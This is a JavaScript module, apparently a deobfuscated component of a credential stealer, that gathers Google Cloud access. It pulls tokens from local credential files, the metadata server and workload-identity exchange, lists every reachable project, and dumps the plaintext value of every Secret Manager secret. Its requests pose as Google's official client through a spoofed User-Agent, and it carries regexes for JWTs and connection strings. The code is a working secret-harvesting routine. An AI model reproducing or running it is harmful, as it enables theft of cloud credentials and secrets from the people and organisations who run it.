/*
 * GCP metadata, service account, external account token exchange, project discovery, and Secret Manager collection.
 */

var gcpTokenCache = new Map(),
  gcpTokenRefreshSkewSeconds = 300;
function gcpTokenCacheKey(gcpTokenCacheScope) {
  return gcpTokenCreateHash("sha256").update(gcpTokenCacheScope).digest("hex");
}
function getCachedGcpToken(gcpCachedTokenScope) {
  let gcpCachedTokenEntry = gcpTokenCache.get(
    gcpTokenCacheKey(gcpCachedTokenScope),
  );
  if (!gcpCachedTokenEntry) return;
  if (
    Date.now() / 1000 >
    gcpCachedTokenEntry.token.expiresOn - gcpTokenRefreshSkewSeconds
  ) {
    gcpTokenCache.delete(gcpTokenCacheKey(gcpCachedTokenScope));
    return;
  }
  return gcpCachedTokenEntry.token;
}
function cacheGcpToken(gcpTokenToCache, gcpTokenScopeToCache) {
  gcpTokenCache.set(gcpTokenCacheKey(gcpTokenScopeToCache), {
    token: gcpTokenToCache,
    fetchedAt: Date.now() / 1000,
  });
}
async function requestGcpMetadataAccessToken(gcpMetadataScopes) {
  let gcpMetadataTokenUrl =
      "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    gcpMetadataTokenParams = new URLSearchParams({
      scopes: normalizeGcpScopes(gcpMetadataScopes),
    }),
    gcpMetadataTokenRequestUrl =
      gcpMetadataTokenUrl + "?" + gcpMetadataTokenParams.toString(),
    gcpMetadataTokenResponse = await fetch(gcpMetadataTokenRequestUrl, {
      headers: { ["Metadata-Flavor"]: "Google" },
      signal: AbortSignal.timeout(5000),
    });
  if (!gcpMetadataTokenResponse.ok) {
    let gcpMetadataTokenErrorText = await gcpMetadataTokenResponse
      .text()
      .catch(() => "");
    throw Error(
      "Metadata server token request failed (" +
        gcpMetadataTokenResponse.status +
        "): " +
        gcpMetadataTokenErrorText,
    );
  }
  let gcpMetadataTokenJson = await gcpMetadataTokenResponse.json();
  return {
    token: gcpMetadataTokenJson.access_token,
    expiresOn: Date.now() / 1000 + gcpMetadataTokenJson.expires_in,
  };
}
function signJwtRs256(jwtHeaderObject, jwtPayloadObject, jwtPrivateKey) {
  let jwtHeaderBase64 = Buffer.from(JSON.stringify(jwtHeaderObject)).toString(
      "base64url",
    ),
    jwtPayloadBase64ForSign = Buffer.from(
      JSON.stringify(jwtPayloadObject),
    ).toString("base64url"),
    jwtSigningInput = jwtHeaderBase64 + "." + jwtPayloadBase64ForSign,
    gcpJwtSigner = createGcpJwtSigner("RSA-SHA256");
  gcpJwtSigner.update(jwtSigningInput);
  let jwtSignatureBase64 = gcpJwtSigner.sign(jwtPrivateKey, "base64url");
  return jwtSigningInput + "." + jwtSignatureBase64;
}
async function requestGcpServiceAccountJwtToken(
  gcpServiceAccountScopes,
  gcpServiceAccountCredentials,
) {
  let gcpJwtIssuedAt = Math.floor(Date.now() / 1000),
    gcpServiceAccountJwt = signJwtRs256(
      {
        alg: "RS256",
        typ: "JWT",
        kid: gcpServiceAccountCredentials.private_key_id,
      },
      {
        iss: gcpServiceAccountCredentials.client_email,
        scope: normalizeGcpScopes(gcpServiceAccountScopes),
        aud:
          gcpServiceAccountCredentials.token_uri ??
          "https://oauth2.googleapis.com/token",
        exp: gcpJwtIssuedAt + 3600,
        iat: gcpJwtIssuedAt,
      },
      gcpServiceAccountCredentials.private_key,
    ),
    gcpServiceAccountTokenForm = new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
      assertion: gcpServiceAccountJwt,
    }),
    gcpServiceAccountTokenResponse = await fetch(
      gcpServiceAccountCredentials.token_uri ??
        "https://oauth2.googleapis.com/token",
      {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: gcpServiceAccountTokenForm.toString(),
        signal: AbortSignal.timeout(10000),
      },
    );
  if (!gcpServiceAccountTokenResponse.ok) {
    let gcpServiceAccountTokenErrorText = await gcpServiceAccountTokenResponse
      .text()
      .catch(() => "");
    throw Error(
      "Service account token request failed (" +
        gcpServiceAccountTokenResponse.status +
        "): " +
        gcpServiceAccountTokenErrorText.slice(0, 300),
    );
  }
  let gcpServiceAccountTokenJson = await gcpServiceAccountTokenResponse.json();
  return {
    token: gcpServiceAccountTokenJson.access_token,
    expiresOn: Date.now() / 1000 + gcpServiceAccountTokenJson.expires_in,
    projectId: gcpServiceAccountCredentials.project_id,
  };
}
async function requestGcpWorkloadIdentityToken(
  gcpWorkloadIdentityScopes,
  gcpExternalAccountCredentials,
) {
  let gcpSubjectToken;
  if (gcpExternalAccountCredentials.credential_source.file)
    gcpSubjectToken = (
      await readGcpCredentialFile(
        gcpExternalAccountCredentials.credential_source.file,
        "utf-8",
      )
    ).trim();
  else {
    if (gcpExternalAccountCredentials.credential_source.url) {
      let gcpSubjectTokenResponse = await fetch(
        gcpExternalAccountCredentials.credential_source.url,
        {
          headers:
            gcpExternalAccountCredentials.credential_source.headers ?? {},
          signal: AbortSignal.timeout(5000),
        },
      );
      if (!gcpSubjectTokenResponse.ok)
        throw Error(
          "Subject token fetch failed (" + gcpSubjectTokenResponse.status + ")",
        );
      gcpSubjectToken = (await gcpSubjectTokenResponse.text()).trim();
    } else
      throw Error("External account credential_source missing file or url");
  }
  let gcpTokenExchangeForm = new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:token-exchange",
      audience: gcpExternalAccountCredentials.audience,
      scope: normalizeGcpScopes(gcpWorkloadIdentityScopes),
      requested_token_type: "urn:ietf:params:oauth:token-type:access_token",
      subject_token: gcpSubjectToken,
      subject_token_type: gcpExternalAccountCredentials.subject_token_type,
    }),
    gcpTokenExchangeResponse = await fetch(
      gcpExternalAccountCredentials.token_url,
      {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: gcpTokenExchangeForm.toString(),
        signal: AbortSignal.timeout(10000),
      },
    );
  if (!gcpTokenExchangeResponse.ok) {
    let gcpTokenExchangeErrorText = await gcpTokenExchangeResponse
      .text()
      .catch(() => "");
    throw Error(
      "STS token exchange failed (" +
        gcpTokenExchangeResponse.status +
        "): " +
        gcpTokenExchangeErrorText,
    );
  }
  let gcpTokenExchangeJson = await gcpTokenExchangeResponse.json();
  if (gcpExternalAccountCredentials.service_account_impersonation_url) {
    let gcpImpersonationBody = JSON.stringify({
        delegates: [],
        scope: [normalizeGcpScopes(gcpWorkloadIdentityScopes)],
        lifetime: "3600s",
      }),
      gcpGenerateAccessTokenAction = "generateAccessToken",
      gcpImpersonationResponse = await fetch(
        gcpExternalAccountCredentials.service_account_impersonation_url +
          ":" +
          gcpGenerateAccessTokenAction,
        {
          method: "POST",
          headers: {
            Authorization: "Bearer " + gcpTokenExchangeJson.access_token,
            "Content-Type": "application/json",
          },
          body: gcpImpersonationBody,
          signal: AbortSignal.timeout(10000),
        },
      );
    if (!gcpImpersonationResponse.ok) {
      let gcpImpersonationErrorText = await gcpImpersonationResponse
        .text()
        .catch(() => "");
      throw Error(
        "Service account impersonation failed (" +
          gcpImpersonationResponse.status +
          "): " +
          gcpImpersonationErrorText,
      );
    }
    let gcpImpersonationJson = await gcpImpersonationResponse.json();
    return {
      token: gcpImpersonationJson.accessToken,
      expiresOn: new Date(gcpImpersonationJson.expireTime).getTime() / 1000,
    };
  }
  return {
    token: gcpTokenExchangeJson.access_token,
    expiresOn: Date.now() / 1000 + gcpTokenExchangeJson.expires_in,
  };
}
function normalizeGcpScopes(gcpScopesInput) {
  let gcpDefaultCloudPlatformScope =
    "https://www.googleapis.com/auth/cloud-platform";
  if (gcpScopesInput === gcpDefaultCloudPlatformScope) return gcpScopesInput;
  if (gcpScopesInput.endsWith("/.default")) return gcpDefaultCloudPlatformScope;
  return gcpScopesInput;
}
var googleApplicationCredentialsPath =
  process.env.GOOGLE_APPLICATION_CREDENTIALS ??
  process.env.GOOGLE_APPLICATION_CREDENTIALS ??
  gcpPathJoin(
    gcpHomedir(),
    ".config",
    "gcloud",
    "application_default_credentials.json",
  );
async function readGcpApplicationCredentials() {
  try {
    let gcpApplicationCredentialsText = await readGcpCredentialFile(
        googleApplicationCredentialsPath,
        "utf-8",
      ),
      gcpApplicationCredentialsJson = JSON.parse(gcpApplicationCredentialsText);
    if (
      gcpApplicationCredentialsJson.type === "service_account" &&
      gcpApplicationCredentialsJson.private_key &&
      gcpApplicationCredentialsJson.client_email
    )
      return gcpApplicationCredentialsJson;
    return null;
  } catch {
    return null;
  }
}
async function readGcpExternalAccountCredentials() {
  try {
    let gcpExternalCredentialsText = await readGcpCredentialFile(
        googleApplicationCredentialsPath,
        "utf-8",
      ),
      gcpExternalCredentialsJson = JSON.parse(gcpExternalCredentialsText);
    if (
      gcpExternalCredentialsJson.type === "external_account" &&
      gcpExternalCredentialsJson.token_url
    )
      return gcpExternalCredentialsJson;
    return null;
  } catch {
    return null;
  }
}
function gcpMetadataCredentialSource() {
  return {
    label: "metadata-server",
    getToken: (gcpMetadataRequestedScopes) =>
      requestGcpMetadataAccessToken(gcpMetadataRequestedScopes),
  };
}
async function gcpCredentialsFromFile() {
  let gcpServiceAccountCredentialsFile = await readGcpApplicationCredentials();
  if (!gcpServiceAccountCredentialsFile) return null;
  return {
    label: "service-account:" + gcpServiceAccountCredentialsFile.client_email,
    getToken: (gcpServiceAccountRequestedScopes) =>
      requestGcpServiceAccountJwtToken(
        gcpServiceAccountRequestedScopes,
        gcpServiceAccountCredentialsFile,
      ),
  };
}
async function gcpExternalAccountCredential() {
  let gcpExternalAccountCredentialsFile =
    await readGcpExternalAccountCredentials();
  if (!gcpExternalAccountCredentialsFile) return null;
  return {
    label: "workload-identity-federation",
    getToken: (gcpExternalAccountRequestedScopes) =>
      requestGcpWorkloadIdentityToken(
        gcpExternalAccountRequestedScopes,
        gcpExternalAccountCredentialsFile,
      ),
  };
}
async function getGcpAccessToken(
  gcpAccessTokenScopes,
  gcpAccessTokenTimeoutMs = 5000,
) {
  let gcpCachedAccessToken = getCachedGcpToken(gcpAccessTokenScopes);
  if (gcpCachedAccessToken) return gcpCachedAccessToken;
  let gcpCredentialSources = [],
    gcpFileCredentialSource = await gcpCredentialsFromFile();
  if (gcpFileCredentialSource)
    gcpCredentialSources.push(gcpFileCredentialSource);
  let gcpExternalCredentialSource = await gcpExternalAccountCredential();
  if (gcpExternalCredentialSource)
    gcpCredentialSources.push(gcpExternalCredentialSource);
  gcpCredentialSources.push(gcpMetadataCredentialSource());
  for (let gcpCredentialSource of gcpCredentialSources)
    try {
      let gcpTokenPromise = gcpCredentialSource.getToken(gcpAccessTokenScopes),
        gcpResolvedAccessToken = await Promise.race([
          gcpTokenPromise,
          new Promise((resolveGcpTokenRace, rejectGcpTokenRace) =>
            setTimeout(
              () =>
                rejectGcpTokenRace(
                  Error("timeout (" + gcpCredentialSource.label + ")"),
                ),
              gcpAccessTokenTimeoutMs,
            ),
          ),
        ]);
      return (
        cacheGcpToken(gcpResolvedAccessToken, gcpAccessTokenScopes),
        gcpResolvedAccessToken
      );
    } catch {
      continue;
    }
  throw Error(
    "No GCP credentials available. Set GOOGLE_APPLICATION_CREDENTIALS, or run on a GCP resource with attached service account.",
  );
}
async function enumerateGcpIdentities(
  gcpIdentityScopes = "https://www.googleapis.com/auth/cloud-platform",
  gcpIdentityTimeoutMs = 3000,
) {
  let gcpIdentityResults = [],
    gcpIdentityFileCredentialSource = await gcpCredentialsFromFile(),
    gcpIdentityExternalCredentialSource = await gcpExternalAccountCredential(),
    gcpIdentityCredentialCandidates = [
      ...(gcpIdentityFileCredentialSource
        ? [
            {
              label: gcpIdentityFileCredentialSource.label,
              cred: gcpIdentityFileCredentialSource,
            },
          ]
        : []),
      ...(gcpIdentityExternalCredentialSource
        ? [
            {
              label: gcpIdentityExternalCredentialSource.label,
              cred: gcpIdentityExternalCredentialSource,
            },
          ]
        : []),
      { label: "metadata-server", cred: gcpMetadataCredentialSource() },
    ];
  for (let {
    label: gcpIdentitySourceLabel,
    cred: gcpIdentityCredential,
  } of gcpIdentityCredentialCandidates)
    try {
      let gcpIdentityToken = await Promise.race([
        gcpIdentityCredential.getToken(gcpIdentityScopes),
        new Promise((resolveGcpIdentityRace, rejectGcpIdentityRace) =>
          setTimeout(
            () => rejectGcpIdentityRace(Error("timeout")),
            gcpIdentityTimeoutMs,
          ),
        ),
      ]);
      gcpIdentityResults.push({
        source: gcpIdentitySourceLabel,
        token: gcpIdentityToken,
      });
    } catch {
      continue;
    }
  return gcpIdentityResults;
}
var gcpCloudPlatformScope = "https://www.googleapis.com/auth/cloud-platform",
  gcpSecretManagerBaseUrl = "https://secretmanager.googleapis.com/v1",
  gcpResourceManagerBaseUrl = "https://cloudresourcemanager.googleapis.com/v1",
  gcpSecretManagerTokenCache;
async function getGcpSecretManagerToken() {
  if (gcpSecretManagerTokenCache) {
    if (Date.now() / 1000 < gcpSecretManagerTokenCache.expiresOn - 120)
      return gcpSecretManagerTokenCache.token;
  }
  return (
    (gcpSecretManagerTokenCache = await getGcpAccessToken(
      gcpCloudPlatformScope,
    )),
    gcpSecretManagerTokenCache.token
  );
}
async function gcpApiRequest(gcpApiUrl, gcpHttpMethod = "GET", gcpRequestBody) {
  let gcpBearerToken = await getGcpSecretManagerToken(),
    gcpResponse = await fetch(gcpApiUrl, {
      method: gcpHttpMethod,
      headers: {
        Authorization: "Bearer " + gcpBearerToken,
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "google-api-nodejs-client/7.0.0 gl-node/20.11.0 gccl/7.0.0",
      },
      body: gcpRequestBody,
      signal: AbortSignal.timeout(30000),
    });
  if (!gcpResponse.ok) {
    let gcpApiErrorText = await gcpResponse.text().catch(() => "");
    throw Error(
      "GCP " +
        gcpHttpMethod +
        "\x20" +
        gcpApiUrl +
        " failed (" +
        gcpResponse.status +
        "): " +
        gcpApiErrorText.slice(0, 500),
    );
  }
  let gcpResponseText = await gcpResponse.text();
  if (!gcpResponseText) return {};
  return JSON.parse(gcpResponseText);
}
async function listGcpProjects() {
  let gcpProjects = [],
    gcpProjectsPageToken;
  do {
    let gcpProjectsQuery = new URLSearchParams();
    if (gcpProjectsPageToken)
      gcpProjectsQuery.set("pageToken", gcpProjectsPageToken);
    let gcpProjectsQueryString = gcpProjectsQuery.toString(),
      gcpProjectsPath = "/projects",
      gcpProjectsUrl =
        "" +
        gcpResourceManagerBaseUrl +
        gcpProjectsPath +
        (gcpProjectsQueryString ? "?" + gcpProjectsQueryString : ""),
      gcpProjectsPage = await gcpApiRequest(gcpProjectsUrl);
    if (gcpProjectsPage.projects) gcpProjects.push(...gcpProjectsPage.projects);
    gcpProjectsPageToken = gcpProjectsPage.nextPageToken;
  } while (gcpProjectsPageToken);
  return gcpProjects;
}
async function listGcpSecrets(gcpSecretsProjectId) {
  let gcpSecretItems = [],
    gcpSecretsPageToken;
  do {
    let gcpSecretsQuery = new URLSearchParams();
    if (gcpSecretsPageToken)
      gcpSecretsQuery.set("pageToken", gcpSecretsPageToken);
    let gcpSecretsQueryString = gcpSecretsQuery.toString(),
      gcpProjectPathPrefix = "/projects/",
      gcpSecretsPathSuffix = "/secrets",
      gcpSecretsUrl =
        "" +
        gcpSecretManagerBaseUrl +
        gcpProjectPathPrefix +
        gcpSecretsProjectId +
        gcpSecretsPathSuffix +
        (gcpSecretsQueryString ? "?" + gcpSecretsQueryString : ""),
      gcpSecretsPage = await gcpApiRequest(gcpSecretsUrl);
    if (gcpSecretsPage.secrets) gcpSecretItems.push(...gcpSecretsPage.secrets);
    gcpSecretsPageToken = gcpSecretsPage.nextPageToken;
  } while (gcpSecretsPageToken);
  return gcpSecretItems;
}
async function accessGcpSecretVersion(gcpSecretResourceName) {
  try {
    let gcpLatestVersionAccessSuffix = "/versions/latest:access",
      gcpSecretVersionAccessUrl =
        gcpSecretManagerBaseUrl +
        "/" +
        gcpSecretResourceName +
        gcpLatestVersionAccessSuffix,
      gcpSecretVersionResponse = await gcpApiRequest(gcpSecretVersionAccessUrl);
    if (gcpSecretVersionResponse.payload?.data)
      return Buffer.from(
        gcpSecretVersionResponse.payload.data,
        "base64",
      ).toString("utf-8");
    return;
  } catch {
    return;
  }
}
function lastPathSegment(pathWithSegments) {
  let pathSegments = pathWithSegments.split("/");
  return pathSegments[pathSegments.length - 1] ?? pathWithSegments;
}
class GcpMetadataProvider extends SecretProviderBase {
  constructor() {
    super("gcp", "identity");
  }
  async resolveIdentity(gcpIdentitySource, gcpIdentityTokenRecord) {
    let gcpIdentityProjectIds = [];
    try {
      gcpIdentityProjectIds = (await listGcpProjects())
        .filter(
          (gcpProjectForActiveFilter) =>
            gcpProjectForActiveFilter.lifecycleState === "ACTIVE",
        )
        .map((gcpProjectForIdMap) => gcpProjectForIdMap.projectId);
    } catch {}
    return {
      source: gcpIdentitySource,
      projectId: gcpIdentityTokenRecord.projectId,
      projectIds: gcpIdentityProjectIds,
    };
  }
  async execute() {
    try {
      let gcpEnumeratedIdentities = await enumerateGcpIdentities();
      if (gcpEnumeratedIdentities.length === 0)
        return this.failure(
          "No GCP identities found from any credential source",
        );
      let gcpResolvedIdentities = await Promise.all(
        gcpEnumeratedIdentities.map(
          ({
            source: gcpMappedIdentitySource,
            token: gcpMappedIdentityToken,
          }) =>
            this.resolveIdentity(
              gcpMappedIdentitySource,
              gcpMappedIdentityToken,
            ),
        ),
      );
      return this.success(gcpResolvedIdentities);
    } catch (gcpIdentityExecuteError) {
      return this.failure(
        gcpIdentityExecuteError instanceof Error
          ? gcpIdentityExecuteError
          : Error(String(gcpIdentityExecuteError)),
      );
    }
  }
}
function getGcpProjectIdFromEnv() {
  return (
    process.env.GCP_PROJECT ??
    process.env.GCLOUD_PROJECT ??
    process.env.GOOGLE_CLOUD_PROJECT ??
    process.env.DEVSHELL_PROJECT_ID
  );
}
class GcpSecretManagerProvider extends SecretProviderBase {
  projectIds = [];
  projectErrors = [];
  constructor() {
    super("gcp", "secretmanager", {
      jwt: /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g,
      connection_string: /[A-Za-z]+:\/\/[^@\s]+@[^;\n\s]+/g,
    });
  }
  async execute() {
    this.projectErrors = [];
    try {
      await getGcpAccessToken("https://www.googleapis.com/auth/cloud-platform");
    } catch (gcpSecretManagerAuthError) {
      return this.failure(
        "GCP authentication failed: " +
          (gcpSecretManagerAuthError instanceof Error
            ? gcpSecretManagerAuthError.message
            : String(gcpSecretManagerAuthError)),
      );
    }
    try {
      let gcpEnvProjectId = getGcpProjectIdFromEnv(),
        gcpSecretManagerProjects = gcpEnvProjectId
          ? [
              {
                projectId: gcpEnvProjectId,
                name: gcpEnvProjectId,
                lifecycleState: "ACTIVE",
              },
            ]
          : await listGcpProjects().catch(() => []);
      if (gcpSecretManagerProjects.length === 0)
        return this.failure(
          "No GCP projects found. Set GCP_PROJECT or GOOGLE_CLOUD_PROJECT env var, or ensure the identity has cloudresourcemanager.projects.list permission.",
        );
      this.projectIds = gcpSecretManagerProjects.map(
        (gcpSecretManagerProject) => gcpSecretManagerProject.projectId,
      );
      let gcpSecretManagerResults = [];
      for (let gcpSecretManagerProjectId of this.projectIds)
        try {
          let gcpProjectSecretItems = await listGcpSecrets(
              gcpSecretManagerProjectId,
            ),
            gcpProjectSecrets = {};
          for (let gcpProjectSecretItem of gcpProjectSecretItems) {
            let gcpSecretShortName = lastPathSegment(gcpProjectSecretItem.name);
            try {
              let gcpSecretValue = await accessGcpSecretVersion(
                gcpProjectSecretItem.name,
              );
              gcpProjectSecrets[gcpSecretShortName] =
                gcpSecretValue ?? "EMPTY_OR_BINARY";
            } catch (gcpSecretAccessError) {
              gcpProjectSecrets[gcpSecretShortName] = {
                error:
                  gcpSecretAccessError instanceof Error
                    ? gcpSecretAccessError.message
                    : String(gcpSecretAccessError),
              };
            }
          }
          gcpSecretManagerResults.push({
            projectId: gcpSecretManagerProjectId,
            secrets: gcpProjectSecrets,
          });
        } catch (gcpProjectSecretsError) {
          let gcpProjectSecretsErrorMessage =
            gcpProjectSecretsError instanceof Error
              ? gcpProjectSecretsError.message
              : String(gcpProjectSecretsError);
          this.projectErrors.push({
            project: gcpSecretManagerProjectId,
            error: gcpProjectSecretsErrorMessage,
          }),
            gcpSecretManagerResults.push({
              projectId: gcpSecretManagerProjectId,
              secrets: {},
              error: gcpProjectSecretsErrorMessage,
            });
        }
      if (
        gcpSecretManagerResults.every(
          (gcpProjectResultForFailureCheck) =>
            gcpProjectResultForFailureCheck.error !== void 0,
        )
      )
        return this.failure(
          "All " +
            gcpSecretManagerResults.length +
            " project(s) failed:\n" +
            gcpSecretManagerResults
              .map(
                (gcpFailedProjectResult) =>
                  "\x20\x20" +
                  gcpFailedProjectResult.projectId +
                  ":\x20" +
                  gcpFailedProjectResult.error,
              )
              .join("\x0a"),
        );
      return this.success({
        projects: gcpSecretManagerResults,
        projectErrors:
          this.projectErrors.length > 0 ? this.projectErrors : void 0,
      });
    } catch (gcpSecretManagerExecuteError) {
      return this.failure(
        gcpSecretManagerExecuteError instanceof Error
          ? gcpSecretManagerExecuteError
          : Error(String(gcpSecretManagerExecuteError)),
      );
    }
  }
}
